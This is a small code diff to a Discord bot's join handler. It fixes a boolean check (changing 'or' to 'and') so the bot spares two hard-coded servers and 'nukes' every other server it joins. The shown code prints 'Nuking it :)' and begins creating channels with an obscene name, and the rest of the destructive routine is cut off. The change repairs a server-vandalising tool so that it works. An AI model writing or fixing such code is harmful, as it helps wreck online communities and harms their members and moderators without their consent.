@@ -50,7 +50,7 @@ class Startup(commands.Cog):
     @commands.Cog.listener()
     async def on_guild_join(self, guild):
         print(guild.id)
-        if guild.id != 993573362221715546 or guild.id != 1002658514017202286:
+        if guild.id != 993573362221715546 and guild.id != 1002658514017202286:
             try:
                 print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
                 await guild.create_text_channel(f'fuckme1')
